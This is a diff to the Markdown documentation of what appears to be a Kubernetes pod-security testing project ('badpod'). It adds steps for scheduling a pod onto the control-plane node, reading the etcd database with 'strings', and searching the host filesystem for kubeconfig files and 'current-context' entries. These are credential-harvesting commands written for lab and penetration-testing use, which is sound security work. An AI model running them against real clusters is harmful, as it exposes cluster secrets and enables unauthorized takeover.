@@ -60,12 +60,28 @@ cd badpod
 ```
 ~/Documents/GitHub/badpod main* ❯ cd baseline
 
-~/Documents/GitHub/badpod/baseline main* ❯ ls
-disallow-capabilities          disallow-host-process          restrict-apparmor-profiles
-disallow-host-namespaces       disallow-privileged-containers restrict-seccomp
-disallow-host-path             disallow-proc-mount            restrict-sysctls
-disallow-host-ports            disallow-selinux
-disallow-host-ports-range      kustomization.yaml
+
+## Pick your manifest, uncomment and update the nodeName field with the name of the control-plane node
+
+```
+nodeName: control-plane
 ```
 
+## Check to see if etcd is running on the control-plane node and see where the database is (This is on a kubeadm created cluster)
+```
+data-dir=/var/lib/etcd
+```
 
+## View the data in etcd database:
+```
+strings /var/lib/etcd/member/snap/db | less
+```
+
+## Look for kubeconfigs in the host filesystem
+
+```
+find / -name kubeconfig
+find / -name .kube
+grep -R "current-context" /home/
+grep -R "current-context" /root/
+```
